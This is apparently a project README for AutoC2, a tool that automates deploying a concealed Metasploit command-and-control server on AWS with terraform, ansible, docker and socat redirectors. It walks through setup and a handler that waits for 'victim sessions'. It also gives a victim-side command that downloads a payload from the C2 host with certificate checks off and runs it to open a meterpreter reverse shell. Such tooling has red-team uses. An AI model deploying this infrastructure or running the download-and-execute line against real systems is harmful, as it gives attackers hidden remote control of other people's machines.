
# AutoC2

A quick isolated C2 Deployer.

![AutoC2](/demo_screenshots/AutoC2_1.PNG)


## Overview

AutoC2 makes use of terraform + ansible to deploy and hide a command and control server with isolated docker network within less than 5 mins in a single click!

Brief outline of what the tool does :

1. deploys an ec2 micro instance on desired region given by user.

2. setup the C2 server which is not exposed to the internet with the help of isolated docker network which consists of multiple socat redirectors and a metasploit container instance.

3. uses meterpreter_reverse_http as payload and similar payloads such as 
meterpreter_reverse_https and meterpreter_reverse_tcp works as well. (requires modification to docker_delivery.rc file)

This automated script is bulit over technique demonstrated by the author of following blog. All credits for technique/ detailed explanation of how this is built can be found here:

https://khast3x.club/posts/2020-02-09-C2-Protection-Socat-Docker/




## Prerequisites

* terraform must be installed

* ansible(python 3)must be installed.
```bash
pip3 install ansible
```

* your IAM account credentials (Aws access key and secret key) with admin privileges.

* AWS Region to be deployed and image(tested on ubuntu and works on debain) AMI code.

* set environment variable to ignore ssh key trust warnings
```bash
export ANSIBLE_HOST_KEY_CHECKING=False
```

## Getting Started

* Only files we touch for changing configuration is **vars.tf** and **terraform.tfvars**.  

* first generate SSH keys for setting up public key authentication on any launched instances.  
```bash
ssh-keygen -f keyy
chmod 600 keyy
```
* inside **vars.tf** , update the path to keys in PRIVATE_KEY , PUBLIC_KEY and other values such as region_aws and AMI value (can be found at cloud-images.ubuntu.com). 

* inside **terraform.tfvars** , update IAM user access key and secret key. 

* run the following command inside this repo project root to initiatize resources. 

```bash
terraform init
```

* Now run the following command to bring up the c2 server . this inturn calls up the ansible playbook to set up the software provisioning and isolated docker network.
```bash
terraform apply
```

* That's it! Infra is set up. Now ssh to the C2 instance using same priv key which was generated before and execute **docker_delivery.rc** metasploit script to start listening for connections.
```bash
SSH -i kkey ubuntu@c2-ip
```

* Verify containers are running.
```bash
sudo docker container ls
```

* Execute metasploit auto handler script inside msf container.
and wait for victim sessions.

```bash
sudo docker container exec -it msf /bin/bash

./msfconsole -r docker_delivery.rc

```
![AutoC2](/demo_screenshots/AutoC2_2.PNG)
![AutoC2](/demo_screenshots/AutoC2_3.PNG)

* By default it generates payload for linux x64 systems.can be modified for different target by modifying **docker_delivery.rc** file

*  By default docker_delivery.rc uses certificate picked up automatically by metasploit.

* On a **victim box**, execute the following to get reverse meterpreter shell on attacker msf container.

```bash
wget --no-check-certificate https://c2IP/delivery
chmod +x delivery
./delivery&
```
![AutoC2](/demo_screenshots/Auto_victim1.PNG)
![AutoC2](/demo_screenshots/AutoC2_7.PNG)
* Finally to destroy the infrastructure completely(use this with caution!) use the following command :
```bash
terraform destroy
```


